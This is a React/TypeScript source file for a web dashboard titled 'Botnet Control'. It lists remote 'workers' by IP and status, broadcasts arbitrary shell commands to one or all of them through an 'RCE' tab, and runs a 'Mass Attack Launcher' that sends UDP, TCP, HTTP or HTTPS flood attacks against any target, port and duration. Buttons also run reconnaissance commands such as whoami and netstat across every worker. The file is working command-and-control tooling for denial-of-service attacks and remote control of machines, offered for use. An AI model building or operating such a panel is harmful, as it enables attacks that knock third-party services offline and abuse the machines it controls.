"use client";
import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { Terminal, Send, Trash2, Target, Globe, Server } from "lucide-react";
import api from "@/lib/api";
import Loader from "@/components/Loader";
import { useToast } from "@/components/ToastPopup";

interface Worker {
  id: string;
  server_id: string;
  server_ip: string;
  status: string;
  pid: number;
  last_heartbeat: string;
}

interface CmdResult {
  worker_id: string;
  cmd_id: string;
  ok: boolean;
  output: string;
  error: string;
}

type TabType = "rce" | "mass" | "botnet";

export default function WorkerControl() {
  const [workers, setWorkers] = useState<Worker[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<TabType>("rce");
  const [workerId, setWorkerId] = useState("all");
  const [command, setCommand] = useState("");
  const [output, setOutput] = useState<string[]>([]);
  const [sending, setSending] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);
  const { showToast } = useToast();

  // Mass attack
  const [massTarget, setMassTarget] = useState("");
  const [massMethod, setMassMethod] = useState("UDP");
  const [massPort, setMassPort] = useState("80");
  const [massTime, setMassTime] = useState(30);
  const [massWorkers, setMassWorkers] = useState(5);

  useEffect(() => {
    fetchWorkers();
    const t = setInterval(fetchWorkers, 10000);
    return () => clearInterval(t);
  }, []);

  const fetchWorkers = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await api.get("/workers", {
        headers: { Authorization: `Bearer ${token}` },
      });
      setWorkers(res.data);
    } catch {
      // ignore
    } finally {
      setLoading(false);
    }
  };

  const addOutput = (line: string) => {
    setOutput((prev) => [...prev.slice(-99), `[${new Date().toLocaleTimeString()}] ${line}`]);
    setTimeout(() => outputRef.current?.scrollTo({ top: 99999, behavior: "smooth" }), 50);
  };

  const sendRCE = async () => {
    if (!command.trim()) return;
    setSending(true);
    addOutput(`> ${command} (target: ${workerId})`);

    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/rce", {
        worker_id: workerId,
        command: command.trim(),
        timeout: 60,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`✓ Sent. CMD ID: ${res.data.cmd_id}`);
      if (res.data.count) addOutput(`→ Targeting ${res.data.count} workers`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`✗ Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    } finally {
      setSending(false);
      setCommand("");
    }
  };

  const sendMassAttack = async () => {
    if (!massTarget.trim()) return;
    setSending(true);
    addOutput(`> MASS ${massMethod} ${massTarget}:${massPort} for ${massTime}s`);

    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/mass", {
        action: "attack",
        target: massTarget,
        method: massMethod,
        port: massPort,
        time: massTime,
        concurrents: massWorkers,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`✓ Mass attack sent. ID: ${res.data.attack_id}, Workers: ${res.data.count || "all"}`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`✗ Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    } finally {
      setSending(false);
    }
  };

  const sendMassCommand = async (cmd: string) => {
    addOutput(`> MASS EXEC: ${cmd}`);
    try {
      const token = localStorage.getItem("token");
      const res = await api.post("/workers/mass", {
        action: "exec",
        command: cmd,
      }, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      addOutput(`✓ Sent to ${res.data.count || "all"} workers. ID: ${res.data.attack_id}`);
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { detail?: string } }; message?: string };
      addOutput(`✗ Error: ${axiosErr.response?.data?.detail || axiosErr.message}`);
    }
  };

  const clearOutput = () => setOutput([]);

  if (loading) return <Loader variant={1} />;

  const online = workers.filter((w) => w.status === "running").length;

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-sm font-medium text-white">Botnet Control</h2>
          <p className="text-xs text-text-muted">{online}/{workers.length} workers online</p>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex gap-0.5 bg-subtle border border-border rounded-lg p-0.5 w-fit overflow-x-auto">
        {[
          { id: "rce" as TabType, label: "RCE", icon: Terminal },
          { id: "mass" as TabType, label: "Mass Attack", icon: Target },
          { id: "botnet" as TabType, label: "Botnet", icon: Globe },
        ].map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                activeTab === tab.id ? "bg-primary/10 text-primary" : "text-text-muted hover:text-white"
              }`}
            >
              <Icon size={13} />
              {tab.label}
            </button>
          );
        })}
      </div>

      {activeTab === "rce" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
          <div className="flex items-center gap-3">
            <div className="flex-1">
              <label className="block text-xs text-text-muted mb-1">Target Worker</label>
              <select
                value={workerId}
                onChange={(e) => setWorkerId(e.target.value)}
                className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
              >
                <option value="all">ALL WORKERS (broadcast)</option>
                {workers.map((w) => (
                  <option key={w.id} value={w.id}>
                    {w.server_id} ({w.server_ip}) - {w.status}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div className="flex gap-2">
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && sendRCE()}
              placeholder="Enter command to execute on worker..."
              className="flex-1 bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50 font-mono"
            />
            <button
              onClick={sendRCE}
              disabled={sending || !command.trim()}
              className="flex items-center gap-1.5 bg-primary text-background text-xs px-4 py-2 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
            >
              <Send size={13} />
              Execute
            </button>
          </div>

          <div className="border border-border rounded-lg overflow-hidden">
            <div className="flex items-center justify-between bg-muted/50 px-3 py-2 border-b border-border">
              <span className="text-xs text-text-muted font-medium uppercase tracking-wider">Output</span>
              <button onClick={clearOutput} className="text-text-muted hover:text-danger transition-colors">
                <Trash2 size={13} />
              </button>
            </div>
            <div
              ref={outputRef}
              className="bg-[#0a0e14] p-3 h-64 overflow-y-auto font-mono text-xs leading-relaxed"
            >
              {output.length === 0 ? (
                <span className="text-text-muted">No commands executed yet. Type a command above.</span>
              ) : (
                output.map((line, i) => (
                  <div
                    key={i}
                    className={`${line.includes("✗") ? "text-danger" : line.startsWith(">") ? "text-primary" : "text-text-muted"}`}
                  >
                    {line}
                  </div>
                ))
              )}
            </div>
          </div>
        </motion.div>
      )}

      {activeTab === "mass" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
          <div className="border border-border rounded-lg p-4 space-y-4">
            <h3 className="text-sm font-medium text-white">Mass Attack Launcher</h3>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <div>
                <label className="block text-xs text-text-muted mb-1">Target</label>
                <input
                  type="text"
                  value={massTarget}
                  onChange={(e) => setMassTarget(e.target.value)}
                  placeholder="1.2.3.4 or example.com"
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50"
                />
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Method</label>
                <select
                  value={massMethod}
                  onChange={(e) => setMassMethod(e.target.value)}
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
                >
                  <option value="UDP">UDP Flood</option>
                  <option value="TCP">TCP Flood</option>
                  <option value="HTTP">HTTP Flood</option>
                  <option value="HTTPS">HTTPS Flood</option>
                </select>
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Port</label>
                <input
                  type="text"
                  value={massPort}
                  onChange={(e) => setMassPort(e.target.value)}
                  placeholder="80"
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50"
                />
              </div>
              <div>
                <label className="block text-xs text-text-muted mb-1">Duration (s)</label>
                <input
                  type="number"
                  value={massTime}
                  onChange={(e) => setMassTime(Number(e.target.value))}
                  min={1}
                  className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:border-primary/50"
                />
              </div>
            </div>
            <button
              onClick={sendMassAttack}
              disabled={sending || !massTarget}
              className="flex items-center gap-2 bg-danger text-white text-sm font-medium px-4 py-2 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
            >
              <Target size={14} />
              {sending ? "Launching..." : `Launch Mass ${massMethod} Attack`}
            </button>
          </div>

          <div className="border border-border rounded-lg p-4 space-y-3">
            <h3 className="text-sm font-medium text-white">Quick Mass Commands</h3>
            <div className="flex flex-wrap gap-2">
              {[
                { label: "uptime", cmd: "uptime" },
                { label: "whoami", cmd: "whoami" },
                { label: "free -m", cmd: "free -m" },
                { label: "df -h", cmd: "df -h" },
                { label: "ps aux", cmd: "ps aux | head -20" },
                { label: "netstat", cmd: "netstat -tlnp" },
                { label: "ip addr", cmd: "ip addr" },
                { label: "Uname -a", cmd: "uname -a" },
              ].map((b) => (
                <button
                  key={b.label}
                  onClick={() => sendMassCommand(b.cmd)}
                  className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white hover:border-primary/50 transition-all"
                >
                  {b.label}
                </button>
              ))}
            </div>
          </div>

          <div ref={outputRef} className="bg-[#0a0e14] border border-border rounded-lg p-3 h-48 overflow-y-auto font-mono text-xs leading-relaxed">
            {output.length === 0 ? (
              <span className="text-text-muted">Output will appear here...</span>
            ) : (
              output.slice(-20).map((line, i) => (
                <div
                  key={i}
                  className={`${line.includes("✗") ? "text-danger" : line.startsWith(">") ? "text-primary" : "text-text-muted"}`}
                >
                  {line}
                </div>
              ))
            )}
          </div>
        </motion.div>
      )}

      {activeTab === "botnet" && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
          <div className="border border-border rounded-lg overflow-x-auto">
            <table className="w-full text-xs">
              <thead>
                <tr className="border-b border-border bg-muted/50">
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">ID</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Hostname</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">IP</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Status</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">PID</th>
                  <th className="text-left px-3 py-2.5 text-text-muted font-medium uppercase tracking-wider">Last Seen</th>
                </tr>
              </thead>
              <tbody>
                {workers.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-3 py-8 text-center text-text-muted">No workers registered</td>
                  </tr>
                ) : (
                  workers.map((w) => (
                    <tr key={w.id} className="border-t border-border/50 hover:bg-muted/20 transition-colors">
                      <td className="px-3 py-2.5 font-mono text-text-muted">{w.id.slice(0, 8)}</td>
                      <td className="px-3 py-2.5 text-white">{w.server_id}</td>
                      <td className="px-3 py-2.5 font-mono text-text-muted">{w.server_ip}</td>
                      <td className="px-3 py-2.5">
                        <span className={`inline-flex items-center gap-1 text-xs ${
                          w.status === "running" ? "text-success" : "text-text-muted"
                        }`}>
                          <span className={`w-1.5 h-1.5 rounded-full ${
                            w.status === "running" ? "bg-success" : "bg-border"
                          }`} />
                          {w.status}
                        </span>
                      </td>
                      <td className="px-3 py-2.5 font-mono text-text-muted">{w.pid || "-"}</td>
                      <td className="px-3 py-2.5 font-mono text-text-muted">
                        {w.last_heartbeat ? new Date(w.last_heartbeat).toLocaleTimeString() : "-"}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => sendMassCommand("uptime")}
              className="text-xs bg-primary/10 border border-primary/30 rounded-md px-3 py-1.5 text-primary hover:brightness-110 transition-all"
            >
              Ping All Workers
            </button>
            <button
              onClick={() => sendMassCommand("free -m")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              Memory Usage
            </button>
            <button
              onClick={() => sendMassCommand("nproc; cat /proc/loadavg")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              CPU Load
            </button>
            <button
              onClick={() => sendMassCommand("lsblk -d | grep disk | wc -l")}
              className="text-xs bg-muted/30 border border-border rounded-md px-3 py-1.5 text-text-muted hover:text-white transition-all"
            >
              Disk Count
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );
}
